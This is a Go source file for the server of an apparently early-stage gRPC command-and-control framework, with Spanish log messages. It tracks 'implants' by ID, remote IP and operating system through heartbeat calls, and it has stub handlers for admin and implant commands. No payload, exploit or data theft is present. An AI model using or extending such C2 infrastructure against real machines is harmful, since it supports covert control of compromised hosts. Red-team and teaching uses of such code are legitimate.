package main

import (
	"context"
	"fmt"
	"github.dev/nireitdev/go-C2-Prana/proto"
	"google.golang.org/grpc"
	"google.golang.org/grpc/reflection"
	"log"
	"net"
)

type Server struct {
	listen   string
	implants map[string]Implant
	proto.UnimplementedServerServer
}

func NewServer() (Server, error) {
	implants := make(map[string]Implant)
	srv := Server{
		listen:   "127.0.0.1:3000", //default
		implants: implants,
	}
	return srv, nil
}

func (s *Server) AdminCmd(ctx context.Context, req *proto.AdminRequest) (*proto.AdminResult, error) {
	//return nil, status.Errorf(codes.Unimplemented, "method ImplantCmd not implemented")
	log.Println("Recibido: ", "Hola Admin!")
	res := proto.AdminResult{Result: req.Request}
	return &res, nil
}
func (s *Server) ImplantCmd(ctx context.Context, req *proto.ImplantRequest) (*proto.ImplantResult, error) {
	log.Println("Recibido desde Implant: ", req.Request)
	res := proto.ImplantResult{Result: "Hola Implant!"}
	return &res, nil
}

func (s *Server) ImplantAlive(ctx context.Context, alive *proto.AliveMsg) (*proto.Empty, error) {
	implant := Implant{ID: alive.ImplantID, IpAddr: alive.IpAddr, OS: alive.OS}
	_, ok := s.implants[implant.ID]
	if !ok {
		log.Printf("New implant: %v \n", implant)
	} else {
		log.Printf("Implant %s its alive! \n", implant.ID)
	}
	s.implants[implant.ID] = implant
	return nil, nil
}

type Implant struct {
	ID     string
	IpAddr string //remote ip address
	OS     string //remote operating system
}

func main() {

	var err error

	srv, err := NewServer()
	if err != nil {
		log.Fatalf("Falla creacion del servidor. Imposible continuar. \n")
	}

	srv.listen = fmt.Sprintf("%s:%s", "0.0.0.0", "3000") //TODO: read from env or config!!
	listen, err := net.Listen("tcp", srv.listen)
	if err != nil {
		log.Fatalln("Imposible crear listener")
	}
	defer listen.Close()
	log.Println("Iniciando server en: ", srv.listen)

	grpcServer := grpc.NewServer()

	reflection.Register(grpcServer) //TODO: habilitar solo en Development mode!

	proto.RegisterServerServer(grpcServer, &srv)
	if err = grpcServer.Serve(listen); err != nil {
		log.Fatalln("Error abriendo socket")
	}

}
